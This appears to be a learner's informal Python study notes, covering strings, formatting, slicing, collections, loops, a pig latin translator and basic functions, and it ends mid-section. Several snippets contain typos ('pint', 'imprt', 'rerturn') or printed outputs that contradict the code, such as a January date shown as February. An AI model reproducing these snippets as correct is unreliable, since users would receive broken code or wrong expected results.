1. Variables    2. Numbers    3. Strings     4. Logic        
5. Data Structures(Collections)     6. Loops       7. Functions
8.Object oriented programs   9. Numpy     10. Pandas         11.Matplotlib


--------------------------------------------
TO CHECK WHETHER PYTHON HAS BEEN INSTALLED
--------------------------------------------
In CMD, type python --version

IDE= Integrated Developer Editor

IDLE = Python's own IDE

-------------------------------------------
TOP SECRET OF TOP PROGRAMMERS
-------------------------------------------

Asking great questions

[Help] Answer not being on screen when running Python script

1)Observed Behaviour
Script runs successfully but answer doesnt show up

2)Expected Behaviour
I expected the answer 2 to show up when i ran the script

3)Link to Code[create a secret post on gist.github.com
https://gist.github.com/Zadinator/6e

4)Where I think the problem is
Must be something different between script and shell
Worked in the shell

5)What I have tried
i tried running the script with different numbers. No difference

6)Errors and warnings
None

7)Version Info
Python 3.5.2

8)Screenshots
N/A

------------------------------------------
WHAT IS A VARIABLE
------------------------------------------
Stores values. variable has a name and a value

number = 1

pint(number)
# output value stored in variable name

# variables are case-sensitive  number != Numbers

# Dynamically typed language if the type of a variable is checked during run-time. 
Common examples includes JavaScript, Objective-C, PHP, Python, Ruby, Lisp, and Tcl

# Also means the type of variable can change unlike c, java that you have to state the type of variable

# using type function to find the type of variable
type(number)
>>int

# USE LOWERCASE VARIABLE NAMES, WITH UNDERSCORES(_)FOR SPACES

-----------------------------------------
NUMBERS (INTEGERS AND FLOAT)
-----------------------------------------
Basic Algebra 


#Integer is a whole number, float is a decimal number
# Float datatype for storing decimal numbers
# Order of computations using BODMAS(brackets order division multiplication addition subtraction)

num_1 = '100'                       # data type = string 
num_2 = '200'
num_3 = '200.5'                       # data type = float
num_4 = 200.5

num_1 = int(num_1)                  # cast num_1 into an integer
num_2 = int(num_2)                  # cast num_2 into an integer
num_3 = int(num_3)                  # returns error ValueError: invalid literal for int() with base 10: '200.5'
num_4 =int(num_4)                   # returns 200 ; cast the float to integer
print(num_1 + num_2)

# Arithmetic Operators:
# Addition:       3 + 2           ; 5 
# Subtraction:    3 - 2           ; 1
# Multiplication: 3 * 2           ; 6
# Division:       5 / 2           ; 2.5 ;divide two numbers and return their quotient as a float.
# Floor Division: 5 // 2          ; 2   ;gets the integer quotient, while discarding the remainder. This means that the result of a//b is always an integer.
# Exponent:       3 ** 2          ; 9
# Modulus:        5 % 2           ; 1   

num = 2
num *= 10                          # num = num * 10
print(num) > 20

# Comparisons:                      # returns bool (True or False)
# Equal:            3 == 2          ; False
# Not Equal:        3 != 2
# Greater Than:     3 > 2
# Less Than:        3 < 2
# Greater or Equal: 3 >= 2
# Less or Equal:    3 <= 2          ;False


Python modules Import random , import math (Python documnetation under IDLE docs  https://docs.python.org/3/)
#Creating a health portion

import random

#players current health
health = 50

#create a variable called difficulty and set it to easy mode(1=easy,2=medium,3=hard)
difficulty = 1

#create a variable called potion health
potion_health = int(random.randint(25, 50)/difficulty)

#store in health variable the vlaue of health and potion health
health = health + potion_health

#print function to output new health value onto screen
print(health)



----------------------------------------------------------
STRINGS
----------------------------------------------------------
++ 3 ways to create strings
name = " Donald"                          # 1. using double quotes

message = "John" says hi"                 # broken strings

TO FIX/HANDLE broken strings
msg = ''' "John" says hi" '''

msg = """ "John" says hi" and             # 2. using 3 quotes for multi-line
he will pay the family a visit """             

msg = " \"John\" says hi "                # using escape character '\'

msg = ' "John" says hi '

print('Hello World')                      # 3. using single quotes

print("c:\drive\name")

print(r"c:\drive\name")                   # treats it as raw string
> c:\drive\name

#ask user for name
name = input('enter your name: ')
print(name)

--------------------------------------------------------
CONCATENATE stings
-------------------------------------------------------
# SHOULD BE OF THE SAME DATA TYPE

A = "part one"
B = "part two"

A + B
> part onepart two                            # no space, adds the values of the variable together

A + ', ' + b                                  # adds the 3 strings together
> part one, part two

A * 3
> part onepart onepart one

"=" *20
> ====================

B=1
A+B , returns error                           # because of different types, it returns an error

A + str(B)                                    # The in-built str() function is used to convert the specified value into a string. 
'part one1'


---------------------------------------------
STRING FORMATTING and F -STRINGS
---------------------------------------------
A = 'part'                                      # data type is string

B = 1                                           # data type is an integer

print("{} - {}".format(A,B))                    # using {} as placeholder for the individual variables        
> part - 1

print("{0} - {1}".format(A.upper(),B))
> PART - 1

print("{1} - {0}".format(A,B))          
> 1 - part


#this concatenating  is not readable; need to be mindful of spaces 
person = {'name': 'Jenn', 'age': 23}
> My name is Jenn and I am 23 years old.

sentence = 'My name is ' + person['name'] + ' and I am ' + str(person['age']) + ' years old.'
print(sentence)
> My name is Jenn and I am 23 years old.

sentence = 'My name is {} and I am {} years old.'.format(person['name'], person['age'])      # using string formatting with a dictionary 
print(sentence)
> My name is Jenn and I am 23 years old.

sentence = 'My name is {0} and I am {1} years old.'.format(person['name'], person['age'])
print(sentence)
> My name is Jenn and I am 23 years old.

sentence = 'My name is {0[name]} and I am {0[age]} years old.'.format(person)                 #         
print(sentence)
> My name is Jenn and I am 23 years old.

l = ['Jenn', 23]
sentence = 'My name is {0[0]} and I am {0[1]} years old.'.format(l)                          # using string formatting with list         
print(sentence)

#using string formatting with a class obj
class Person():

    def __init__(self, name, age):
        self.name = name
        self.age = age

p1 = Person('Jack', '33')

sentence = 'My name is {0.name} and I am {0.age} years old.'.format(p1)
print(sentence)
> My name is Jack and I am 33 years old.

tag = 'h1'
text = 'This is a headline'

sentence = '<{0}>{1}</{0}>'.format(tag, text)
print(sentence)
> <h1>This is a headline</h1>

# using string formatting with keyword  arguments
sentence = 'My name is {name} and I am {age} years old.'.format(name='Jenn', age='30')
print(sentence)

sentence = 'My name is {name} and I am {age} years old.'.format(**person)
print(sentence)

# to zero pad and tab values
for i in range(1, 11):
    sentence = 'The value is {:02}'.format(i)               # {:05} to have 5-digit value(5 for width), and have one tab            
    print(sentence) 

import math
print("Floating point {0:10.3f}".format(math.pi))
> Floating point 3.142
we specify 3 digits of precision, 10 for width and f for floating point number.

pi = 3.14159265

sentence = 'Pi is equal to {:.2f}'.format(pi)               # 2 digit of precision
print(sentence)
> Pi is equal to 3.14

sentence = '1 MB is equal to {:,} bytes'.format(1000**2)     #{:} shows we want to do some formatting 
print(sentence)
> 1 MB is equal to 1,000,000 bytes

import datetime

my_date = datetime.datetime(2016, 9, 24, 12, 30, 45)
print(my_date)
> 2016-09-24 12:30:45

sentence = '{:%B %d, %Y}'.format(my_date)                     # %B month as locale's full name; %d day of the month; %Y year without century as a zero-padded decimal number
print(sentence)
> September 24, 2016

sentence = '{:%B %d, %Y} fell on a {:%A} and was the {:%j} day of the year'.format(my_date)
print(sentence)
> September 24, 2016 fell on a Saturday and was the 268 day of the year

from datetime import datetime
time_now = datetime.now()
sentence = '{0:%B %d, %Y} fell on a {0:%A} and was the {0:%j} day of the year'.format(time_now)
print(sentence)
> February 28, 2021 fell on a Sunday and was the 059 day of the year


----------------------
F-STRING
---------------------
A = 'part'                                                                  # data type is string
B = 1

print(f"{A.upper()} - {B}")                                                 # using f -string to print output
> > PART - 1

first_name = 'Corey'
last_name = 'Schafer'

sentence = f'My name is {} {}'.format(first_name,last_name)
print(sentence)
> My name is Corey Schafer

sentence = f'My name is {first_name} {last_name}'
print(sentence)
> My name is Corey Schafer

person = {'name':'Jenn', 'age':23}

sentence = f"Myname is {person['name']} and I am {person['age']} years old"   # if you use single quote, it will raise error becuase it terminate with the key in the placeholder
print(sentence)

# we can run methods and function in our placeholder
for n in range(1, 11):
    sentence = f'The value is {n:02}'
    print(sentence)

from math import pi
sentence = f'Pi is equal to {pi:.4f}'
print(sentence)

>Pi is equal to 3.1416

from datetime imprt datetime

birthday = datetime(1990, 1, 1)

sentence = f'Jenn has a birthday on {birthday: %B %d %Y}'                         #https://docs.python.org/3/library/datetime.html#strftime-and-strptime-format-codes
> Jenn has a birthday on February 01 1990



--------------------------------------------
DIR method & other useful functions(help, round,divmod, isinstance, pow, input, min, max, sorted, eval)
-------------------------------------------
dir([object])                                 # the object is an optional argument; When nothing is passed, the method returns back the list of all the local attributes(local scope)

print(dir())                                     # returns all methods and attributes/properties of the specified object in an alphabetically sorted manner.
> ['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']

print(dir(string))
> ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']

print(dir(list))
['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']

class shape:                                    #class with custom object with undefined __dir__()
    name = "rectangle"
    sides = 4
 
obj = shape()
print(dir(obj))                                 # dir for our custom object
> ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name', 'sides']

# Python dunder (https://www.tutorialsteacher.com/python/magic-methods-in-python) or magic methods = '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', ...
# Magic/Dunder  methods are the special methods that start and end with the double underscores. 
# Magic methods are not meant to be invoked directly by you, but the invocation happens internally from the class on a certain action. 
# For example, when you add two numbers using the + operator, internally, the __add__() method will be called.
>>> num=10
>>> num + 5
15
>>> num.__add__(5)
15

2. With defined __dir__(), the dir() method calls the corresponding __dir__() method which must again return a list of attributes.

class shape:                                    # class with custom object with defined __dir__()
    name = "rectangle"
    sides = 4
    def __dir__(self):
        return ['Square','Circle']
 
obj = shape()
print(dir(obj))                                 #dir for our custom object
> ['Circle','Square']

# Help() functions                              used to display the documentation of modules, functions, classes, keywords etc
print(help(str))
print(help(str.lower()))
> Help on method_descriptor:

lower(self, /)
    Return a copy of the string converted to lowercase.

round() # rounds floating point number to the nearest integer or specified number of places
round(5.6231)
> 6

round(4.55842, 3)
> 4.558

divmod(x, y) #outputs quotient and remainder in a tuple
divmod(27,5)
> (5,2)

isinstance() return True, if the first arg is an instance of that class
isinstance(1,int)
> True

isinstance(1.0,int)
> False

isinstance(1.0, (int, float))
> True 

pow(x,y)                # returns an output x to the power y 
pow(2,3)
> 8

pow(2,3,3)              # returns the remainder of (2 to the power 3) divided by 3 )
> 2 

input() a = input("Enter name: ") # no matter the input, it returns string type

help(input)             #returns details of function

min()                   # returns the lowest element in a list

max()                   # returns the highest element in a list

sorted(L)               # returns a sorted array , from lowest to highest 

eval("3+4")             #evaluates string and returns an object 
> 7

---------------------------------------------
STRING METHODS
---------------------------------------------
syntax = string.method([argument])

"hello".count("e")

text = "happy birthday"
text.count("a")                         # takes a string as an argument and returns the number of occurence                
> 2

text.count("day")
> 1  

x = "Happy Birthday"
x.lower()
> happy birthday

x.upper()
> HAPPY BIRTHDAY
 
print(x)                        # returns intial value because string are immutable(cannot be changed) , but can be overwritten

x.title()
> Happy Birthday

x.capitalize()                  # returns the capital of the first letter
> Happy birthday

x.isalpha(), x.isupper() , x.istitle(), x.isdigit(), x.isalnum        # because of space, .isalpha() will return false

x = "happy birthday"            # assigned string to a variable

x.index("birthday")             # returns the number of the first occurence(index) of the letter or word  #case-sensitive
> 6

x.index("jashdfasdsfs")         # returns an error

x.find("birthday")
> 6

x.find("adsfsfdsfgdgfsfsdfs")   # returns -1 if it cant be found, so preferred to index. it doesnt return error when the str is not found
-1

y = "000000happy0birthday000000"
y.strip("0")
'happybirthday'                                 # strip off the arg "0" from both sides

y.lstrip("0")                                   # strip off the arg "0" from left side
'happy0birthday0000000"

y.rstrip("0")                                   # strip off the arg "0" from right side
'00000000happy0birthday'

y.strip()                                       # strips the string off spaces

new_y = y.replace("0","")                       # replaces the first argument(substring) with the second substring(argument)
print(new_y)
> happybirthday                     
print(y)                                        # if a new variable is not set, it will return the same value  
> 000000happy0birthday000000

y = y.replace("0","")                           # setting it to the same varibale to modify its value
print(y)

name = input("Whatis your name?: ").strip()
What is your name?: Zee  #with spaces

print(name)      #returns output without space

len(name)        #returns the count of elements in the variable

"at" in "bathlehom"
> True 

"abc" < " daa"
> True

---------------------------------------
SLICING (string)
---------------------------------------
string = "ABCDEFG123456"

#it is ITERABLE meaning you can go through it step by step,  STEP IS CALLED ELEMENT OF THE STRING
#each element has an index and starts from zero

word = "supercalifragilisticexpialidocious"

word[0]
's'

word
'supercalifragilisticexpialidocious'

variable[start:end:step]   # up to end, but included

word[0:5:1]                # get a range of elements , from the first index up to the 5th elemrnt but not including in steps of 1
'super'

word[0:5:2]                 # get a range of elements , from the first index up to the 5th elemrnt but not including in steps of 2
'spr'

word[5:9] = 'cali'

word[5:]
'califragilisticexpialidocious'

word[5::2]                      #slice from the 5th index up to the end, and in 2 steps


word[:7]                        # slice from the beginning up the 7th element but not included
'superca'  

word[::-1]                      # reverse the entire string

sample_url = 'http://coreyms.com'
print(sample_url)

# Reverse the url
print(sample_url[::-1])

# Get the top level domain (TLD)
print(sample_url[-4:])

# Print the url without the http://
print(sample_url[7:])

# Print the url without the http:// or the top level domain
print(sample_url[7:-4])

-------------------------------------------
AUTOMATE SLICES
-------------------------------------------
word[-1]
s 

word[-5]
c 

word[word.index("cali"):word.index("frag")]
cali

word[word.find("cal"):word.find("frag")]
cali
-------------------------
#get user email address
email = input("Enter your email address: ").strip()

#slice out username
#drdecker100@gmail.com
user= email[:email.index("@")]

#slice out domain name
domain = email[email.index("@") + 1:]

#format message
output = "Your usename is {} and your domain name is {}".format(user,domain)

#display output message
print(output) 
--------------------------

------------------------------------------------------
LOGIC AND CONDITIONAL FLOW
------------------------------------------------------
Booleans Comparison Operators

B = True
C = False

E = "True"
type(E)
class 'str'

type(B)
class 'bool'

2 == 3      #equal to
False

2 < 3      #less than
True

2 != 3     #not equal to
True

4 >= 3	   #greather than or equal to
True 

---------------------------------------
IF STATEMENTS (CONTROL FLOW)
---------------------------------------
-aloows us to execute code if the condition is True.

if condition :
	code         #execute if condition is True
--------------------	
if True:
    print("It worked")
    
if False:
    print("It didnt work")

--------------------
num1 = 100
num2 = 150

if num1 > num2:
    print("num1 is bigger than num2")
else:
    print("num2 is bigger than num1")
----------------------
num1 = 100
num2 = 100

if num1 > num2:
    print("num1 is bigger than num2")

elif num2 > num1:
	print("num2 is bigger than num1")

else:
    print("both are equal")
-------------------------------
if condition1:
	code
elif condition2:
	code2
elif condition3:
	code3
else:
	code4
	
-----------------------------------------
LOGICAL OPERATORS
-----------------------------------------
comparison operators   > < = == compare expressions and elements

logical operators combine and modify conditions

not True
> False

not 2 < 3
> False

not 4 == 3
> True

if not y < x:
	print("It worked")

----------------------------------------------------------	
NOT gate had one input (output is inverse of input)
----------------------------------------------------------
"AND" Truth tabel has two inputs, returns True if both inputs are True

1 and 1 
1

1 and 0
0

True and True
True

True and False
False

C = 10
D = 5

#wont print because condition is False
if C > 10 and D > 1:
	print("It worked")

#will print because conditio is True	
if not (C > 10 and D > 1):
	print("It worked")	

---------------------------------------------------------------------------------------------------------
OR Truth Table has two inputs, returns True when one of the inputs is True or when both inputs are True

True or True
True

True or False
True

False or False
False

C = 5
D = -1

if C > 1 or D > 1:
	print("it worked")
	
 C = 6
 D = 2
 
 if (C > 5 and D > 5) or (C > 1 and D > 1):
	print("it worked")


--------------------------------------------------------------------------------------------
DATA STRUCTURES(collections) - List, Tuple, Set, Dictionary

---------------------------------------------------------------------------------------------
LISTS DATA STRUCTURE (list are ordered(positioning/indexing), mutable(changeable), duplicates
----------------------------------------------------------------------------------------------
our_list = [27,46,-5,17,99]
print(our-list)

type(our_list)
class 'list'

paakow = ["A","B","C",1,2,3 "Do","Rey","Mi",True,False]
paakow[4]
2

paakow[-2]
True

S = [12,"banana"", 5.3,12]              #duplicates

------------------------------------------------
SLICING        
------------------------------------------------
# list[start:end:step]                   # end is not inclusive

my_list = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
#          0, 1, 2, 3, 4, 5, 6, 7, 8, 9
#        -10,-9,-8,-7,-6,-5,-4,-3,-2,-1

print(my_list[::-1])                    # prints out first element to the last element in reverse steps (entire list is reversed)
> [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]

print(my_list[0:3])                     # prints out the first element up to the third but not included
> [0,1,2]

print(my_list[-7:-2])                   # prints out the negative 7th index up to the negative 2nd index 
> [3, 4, 5, 6, 7]

print(my_list[-2:-7:-1])                # prints out the negative 2nd index up to the negative 7th index in a reverse step
> [8, 7, 6, 5, 4]

print(my_list[-2:3:-1]) 
> [8, 7, 6, 5, 4]

# Nested list
our_list = [1,2,[3,4,5],6,7,8]

our_list[2]
> [3,4,5]

our_list[2][1]
> 4

our =_list[2][0::2]
> [3,5]

>>> jack = [5,6,7,8,"Ama"]
jack[-1]
> Ama

>>> type(jack[-1])
<class 'str'>

len(jack)
5

L = [1,5,2,6,2,9]
>> 2 in L 
>> True

>> 10 in L 
>> False

-----------------------------------------------------------
# create list of users
known_users = ["Alice","Bob","Kofi","Kwesi","Meggy","Ass","Boobs","Dee"]

print(len(known_users))


while True:
    print("Hi! My name is Travis")
    name = input("Enter your name: ").strip().captilize()

    if name in known_users: 
        print("Hello {}!!".format(name))

    else:
        print("name NOT recognised\n")

------------------------------------------- 
List Methods
-------------------------------------------

known_users.pop(index)      #worked with the index of the element
known_users.pop(3)

known.users.remove(name)	# removes the first occurence of the element, the item should be unique otherwise, you may need a loop

del known_users[0]          #remove object in the first index

-------------------------------------------
Adding items to lists
-------------------------------------------
A = [3,1,45,6,79]

A = A + 1 #returns error, cant concatenate int to list

A = A + [1]
[3,1,45,6,79,1]

A = A + ["BCD"]
[3,1,45,6,79,1,'BCD']

A = A + list("BCD")
A
[3,1,45,6,79,1,'BCD','B','C','D']

A = A + list(123)  # returns error because integers are not iterable. strings are iterable

A = A + [1,2,3]
A 

A = A + list(str(123))
A

A = A + [5,6,7,8]
[3,1,45,6,79,1,'BCD','B','C','D',5,6,7,8]

A = A + [[5,6,7,8]]
[3,1,45,6,79,1,'BCD','B','C','D',[5,6,7,8]]

A.append([10,11,12,13])
A 
[3,1,45,6,79,1,'BCD','B','C','D',[5,6,7,8],[10,11,12,13]]

#the append method returns an empty value
A = [5,12,4,5]
A = A.append(10)            #should not be re-assign instead A.append(10)
A 
     #empty value
type(A)
<class 'NoneType'>

A = []
type(A.append(10))
<class 'NoneType'>

A.insert(index, element)
A.insert(2,100)
[5,12,100,4,5]	 

A.insert(2,[10,20,30])
[5,12,[10,20,30],100,4,5]

#list are mutable (You do not need to re-assign with list methods, will return NoneType

A = [1,2,3]
A[0] =5
A = [5,2,3]


---------------------------------------------------------------------------
TUPLES (ordered ; unchangeable(immutable); duplicates)
---------------------------------------------------------------------------
#oNCE A tuple is created, you cannot change its contents 
#it is immutable

our_tuple = 1,2,3,"A","B","C"

type(our_tuple)
<class 'tuple'>

our_tuple = (1,2,3,"A","B","C")
type(our_tuple)
<class 'tuple'>

our_tuple[0:3]
(1,2,3)

S = (12,"banana"", 5.3,12)

#tuple object does not support item assignment
our_tuple[2] = 100   #returns error

#string are iterable but does not support assigment

A = [1,2,3]

tuple(A)
(1,2,3)

A = tuple(A)
(1,2,3)

(A,B,C) = 1,2,3
A 
1
B 
2
C 
3

D,E,F = [1,2,3]
D 
1
E 
2
F 
3

G,H,I = "789"
G
7
H
8
I 
9

del A   #can delete all items, but can not delete one element(immutable)

T2 = T  #to copy elements


---------------------------------------------------------
SETS (Unordered ; addable/removable ; no duplicates)
---------------------------------------------------------
S = {12,"banana"", 5.3}

X in S  # returns True or False

S.add("new item")
S.update({"more","items"})      #more than one element
S.remove("banana")
del S 

S2 = S.copy()


---------------------------------------------------------
DICTIONARIES (Unordered ; changeable ; no duplicates)
---------------------------------------------------------
students = {}
students
{}
type(students)
<class 'dict'>

students = {"Dan":20, "Bob":30}
students
{'Dan': 20, 'Bob': 30}
error_std = {Alice:20, Bob:30}
Traceback (most recent call last):
  File "<pyshell#6>", line 1, in <module>
    error_std = {Alice:20, Bob:30}
NameError: name 'Alice' is not defined

students["Dan"]
20

#adding another key to the dictionary
students["Fred"] = 40
students
{'Dan': 20, 'Bob': 30, 'Fred': 40}
 
#to delete a item(key,value
del students["Fred"]
students
{'Dan': 20, 'Bob': 30}
 
#to read the keys of the dictionary
students.keys()
dict_keys(['Dan', 'Bob'])
 
#it is iterable , but not indexable
 
students.key()[0]
Traceback (most recent call last):
  File "<pyshell#21>", line 1, in <module>
    students.key()[0]
AttributeError: 'dict' object has no attribute 'key'
>>> 
#wont work, unless we turn it into a list

students_keys = list(students.keys())
students_keys
['Dan', 'Bob']
students_keys[1]
>'Bob'
 
students.values()
dict_values([20, 30])
b = list(students.values())
b
[20, 30]
b[1]
30
 
#Unlike a tuple and list, dictionaries are orderless
students
{'Dan': 20, 'Bob': 30}

#to concatenate two dictionaries 
D = {"name": ["Ama","Afia"], "age" : ["20","30"]}
D2 = {"blood" :["O","AB"]}

D.update(D2)
print(D)
{'name': ['Ama', 'Afia'], 'age': ['20', '30'], 'blood': ['O', 'AB']}


#Problems

def getDataFromUser():
    D = {}
    while True:
            
        studentId = input("Enter student ID: ")
        marksList = input("Enter the marks by comma separated values: ")
        moreStudent = input('Enter "no" to quit insertions or enter to continue: ')

        if studentId in D:
            print(studentId, "is already inserted")

        else:
            D[studentId] = marksList.split(",")
        
        if moreStudent.lower() == "no":
            return D 
        
        quitters = input("Enter q,x,exit to quit program: ")
        if quitters.lower() in ["q","x","exit"]:
            print("See you again")
            return

studentData = getDataFromUser()

print(studentData)

#from statistics import mean

def getAvgMarks(D):
    avgMarks = {}
    for key, value in D.items():
        s= 0
        for num in value:
            s+=int(num)
        avgMarks[key] = s/len(value)
    
    return avgMarks 

avgM = getAvgMarks(studentData)

for x in avgM:
    print("Student with ID: {} has an avarage of {}".format(x, avgM[x]))

-----------------------------------------
pass keyword just python to MOVE ON

#students = {
        "Don":["ID001",10,"A"],
        "Ewe":["ID002",20,"B"],
        "Ama":["ID003",30,"C"],
        "Yaw":["ID004",40,"D"],
        "Afi":["ID005",50,"E"]
        }

students = {
        "Don":{"id":"ID001","age":10,"grade":"A"},
        "Ewe":{"id":"ID002","age":20,"grade":"B"},
        "Ama":{"id":"ID003","age":30,"grade":"C"},
        "Yaw":{"id":"ID004","age":40,"grade":"D"},
        "Afi":{"id":"ID005","age":50,"grade":"E"}
        }


print(students["Don"]["age"])

print(students["Emma"]["id"] , students["Emma"]["grade"])


------------------------------------------
WHILE LOOPS! (CONTROL FLOW)
------------------------------------------
repeats code over and over again while the condition is true.

while True:               #infinite iteration
	print("Hello")

	
while 2>1:                #infinite iteration becuase conditions remains true always
	print("Hello")


	
num = 1

while num <= 5:
    print(num)
    num = num + 1         # num += 1

print(" loop done")    
print(num)

>
1
2
3
4
5
 loop done 
6

L =[]

while len(L) < 3:
    new_name = input("Please add anew name: ").strip().capitalize()
    L.append(new_name)

print("Sorry, list is full")
print(L)

-----------------------------------------------------------------

from random import choice

while True: 
    #create a list of questions
    questions = ["Why is my name Kwame?: ","How old am i?: ","What is a television?: "]

    question = choice(questions)

    #prompt for baby to ask question

    answer = input(question).strip().lower()

    #want code to run when the answer is not "just because"

    while answer != "just because":
        print("Noooooooooo\n")
        answer = input("Why?: ")

    print("Oh.. Okay\n")
	
--------------------------------------------------------------------
FOR LOOPS
--------------------------------------------------------------------
#A for loop is used for iterating over a sequence (that is either a list, a tuple, a dictionary, a set, or a string)

type(range(6))
<class 'range'>

#In Python, range outputs a range iterable

#"for loops" are called iterators. Just like while loop, "For Loop" is also used to repeat the program. 
# But unlike while loop which depends on condition true or false.. For Loop iterates with number declared in the range.

range(6)
range(0, 6)

list(range(0, 6))
> [0,1,2,3,4,5]

list(range(0,10,2)):
> [0,2,4,6,8]

for number in range(1,4)
	print(number)
1
2
3

for item in "abcd"
	print(item)
a
b 
c 
d 

for number in [1,2,3,4]
	print(number)
1
2
3
4

#number(variable) becomes the next iterable in for loop

for number in range(1,7,2):
	print(number)
1
3
5

students = {'male': ['1', '2', '3'], 'female': ['Kate', 'Ann', 'Naa']} 

for value in students.values():
	for name in value:
		if "a" in name:
			print(name)
			
for  key in students.keys():
	for name in key:
		if "a" in name:
			print(name)
			
for key in students:
	for name in key:
		if "a" in name:
			print(name)
			
##same results

for key in students:
    print(key, students[key])

> male ['1', '2', '3']
  female ['Kate', 'Ann', 'Naa']

# finding the smallest number in a list
L = [2,1,3,-5,2,-6]

m = L[0]

for i in L:              #iterate through list L
    
    if i<m:
        m = i            #replace with new value
        
print(m)

# finding the largest number in a list
L = [2,1,3,-5,2,-6]

m = L[0]

for i in L:              #iterate through list L
    
    if i>m:
        m = i            #replace with new value
        
print(m)

#Sorting numbers of a list
L = [1,2,4,-5,7,9,3,2]
for j in range(len(L)):
    m = L[j]
    idx = j
    c = j
    for i in range(j,len(L)):
        if L[i]<m:
            m = L[i]
            idx = c
        c+=1    
    tmp = L[j]
    L[j] = m
    L[idx] = tmp
print(L)

-------------------------------------------------------------------------
List comprehension
-------------------------------------------------------------------------
SHORT cut to combine for loops and if statement to create a list

even_numbers = [x for x in range(1,101) if x % 2 ==0]

odd_numbers = [x for x in range(1,101) if x % 2 !=0]

words = ["the","quick", "brown"]

answer = [[w.upper(),w.lower(),len(w) for w in words]

print(answer)

------------------------------------------------------------------------
BREAK, CONTINUE, PASS  (loop control statements)
------------------------------------------------------------------------
    else:
        vowel_pos = 0
        for letter in word:
            if letter not in "aeiou":
                vowel_pos = vowel_pos + 1
            else:
                break


the BREAK keyword breaks the loop and takes you back to the else statement

Whereas, the cCONTINUE keyword takes you to the loop above, in this case, the if statement

# Using loops in Python automates and repeats the tasks in an efficient manner

# The break statement is used to terminate the loop or statement in which it is present. 
After that, the control will pass to the statements that are present after the break statement,
if available.

# Python program to demonstrate break statement  
    
s = 'geeksforgeeks'
  
for letter in s:  
      
    if letter == 'e' or letter == 's':  
        break                             # break the loop as soon it sees 'e' or 's'
    
print("Out of for loop")  
print() 

# continue statement is opposite to that of break statement, 
instead of terminating the loop, it forces to execute the next iteration of the loop.
.When the continue statement is executed in the loop, the code inside the loop following the continue statement will be skipped 
and the next iteration of the loop will begin.

# Python program to demonstrate continue statement  
    
# loop from 1 to 10  
for i in range(1, 11):  
      
    if i == 6:  
        continue                   # if i is equals to 6,continue to next iteration without printing 
    else:           
        print(i, end = " ")        # otherwise print the value of i 

n = 10
i = 1
while True:
    if i%9 != 0:
        print("Inside loop")
        i += 1
        continue

    print("something")
    print("somethingelse")
    break

print("done")
		
#PASS STATEMENT simple DOES NOTHING. The pass statement in Python is used when a statement is required syntactically but you do not want any command or code to execute. 
#It is like null operation, as nothing will happen is it is executed. 
#Pass statement can also be used for writing empty loops.

# Python program to demonstrate 
# pass statement 
  
  
s = "geeks"
  
# Empty loop 
for i in s: 
    pass                          # No error will be raised
     
  
# Empty function 
def fun(): 
    pass                          # No error will be raised
  

fun()   
  
# Pass statement 
for i in s: 
    if i == 'k': 
        print('Pass executed') 
        pass
    print(i)

----------------------------------------------------
PIG LATIN TRANSLATOR
----------------------------------------------------
#get sentence from user
original = input("Enter a sentence: ").strip().lower()

#split sentence into words
words = original.split()
            
#loop through words and convert to pig latin

#if starts with vowel, just add "yay"

#Otherwise, move the first consonant cluster to the end, and add "ay"

new_words = []

for word in words:
    if word[0] in "aeiou":
        new_word = word + "yay"
        new_words.append(new_word)
    else:
        vowel_pos = 0
        for letter in word:
            if letter not in "aeiou":
                vowel_pos = vowel_pos + 1
            else:
                break
        cons = word[:vowel_pos]
        the_rest = word[vowel_pos:]
        new_word = the_rest + cons + "ay"
        new_words.append(new_word)

#stick back together
output = " ".join(new_words)

#output the final string
print(output)

-------------------------------------------------------
Functions
-------------------------------------------------------
#Functions is a block of organized and reusuable code that performs an action

#defining a function    def printMessage(inputArguments):

def functionName(params):

def add(x,y):
	return x + y

#calling a function
add(5,3)

#return a value
8

#can store in a variable
answer = add(100,20)
answer = 120

#returning a value != printing a value
returning stores in variable name in memory, print just displays the output on screen

return makes a local variable accessible outside the function

a= print("hello")
type(a)
<class 'NoneType'>

def rev(text):
	return text[::-1]
	
rev('pen')

rev([1,2,3,4])

#USING docstring with function 
def printSuccess():
    """This function is returns Hello world when called"""
    rerturn "Hello World"

printSuccess()        #to call function

help(printSuccess)    # returns the docstring in the function


A python function always returns NOne if there is no return/print in the function

#using return without an argument works like a break function
def h():
    print("A")
    a = 3
    b = 5
    print("something")
    return              #acts as break
    print("B")

def f():
    a = 5
    b = 7
    d = "something"
    return a,b,d        #can return multipel values


#function(default values)
def f(sum=0):
